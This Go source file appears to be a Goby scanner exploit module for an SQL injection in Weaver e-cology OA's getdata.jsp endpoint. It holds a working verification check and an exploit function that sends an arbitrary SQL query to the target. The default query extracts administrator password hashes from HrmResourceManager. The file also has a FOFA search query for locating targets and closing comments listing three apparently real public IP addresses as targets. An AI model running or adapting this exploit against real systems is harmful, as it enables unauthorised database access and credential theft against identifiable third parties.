package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver e-cology OA getdata.jsp sqli",
    "Description": "<p>Fenwei ecology collaborative business office system has SQL injection vulnerabilities, which may cause data leakage and even server intrusion.</p>",
    "Product": "Weaver-OA",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2020-06-21",
    "Author": "1291904552@qq.com",
    "FofaQuery": "app=\"Weaver-OA\" || app=\"Wild - collaborative office OA\"||app=\"泛微-协同办公OA\"",
    "GobyQuery": "app=\"Weaver-OA\" || app=\"Wild - collaborative office OA\"||app=\"泛微-协同办公OA\"",
    "Level": "2",
    "Impact": "<p>Fenwei ecology collaborative business office system has SQL injection vulnerabilities, which may cause data leakage and even server intrusion.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.weaver.com.cn\">https://www.weaver.com.cn</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Translation": {
        "CN": {
            "Name": "泛微 ecology 协同商务办公系统 SQL 注入",
            "VulType": [
                "SQL注入"
            ],
            "Description": "<p>泛微ecology协同商务办公系统存在SQL注入漏洞，可能造成数据泄漏，甚至服务器被入侵。</p>",
            "Impact": "<p>泛微ecology协同商务办公系统存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在数据库权限足够的情况下可以向服务器中写入一句话木马，从而获取 webshell 或进一步获取服务器系统权限。</p>",
            "Product": "泛微-协同商务系统",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.weaver.com.cn\">https://www.weaver.com.cn</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>"
        },
        "EN": {
            "Name": "Weaver e-cology OA getdata.jsp sqli",
            "VulType": [
                "sqli"
            ],
            "Description": "<p>Fenwei ecology collaborative business office system has SQL injection vulnerabilities, which may cause data leakage and even server intrusion.</p>",
            "Impact": "<p>Fenwei ecology collaborative business office system has SQL injection vulnerabilities, which may cause data leakage and even server intrusion.</p>",
            "Product": "Weaver-OA",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.weaver.com.cn\">https://www.weaver.com.cn</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>"
        }
    },
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sqlQuery",
            "type": "input",
            "value": "select password as id from HrmResourceManager"
        }
    ],
    "ExpTips": null,
    "ScanSteps": null,
    "Tags": [
        "sqli"
    ],
    "VulType": [
        "sqli"
    ],
    "CVEIDs": [
        ""
    ],
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "Weaver-OA"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "PocId": "6836"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Rand1 := 1000 + rand.Intn(10)
			uri1 := fmt.Sprintf(`/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%%20%d%%20as%%20id`, Rand1)
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, strconv.Itoa(Rand1))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["sqlQuery"].(string)
			uri := "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=" + url.QueryEscape(cmd)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					body := strings.ReplaceAll(resp.RawBody, "\r\n", "")
					expResult.Output = "MD5: " + body
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}

//http://111.87.78.187/
//http://49.233.186.110
//http://125.69.0.41:8088
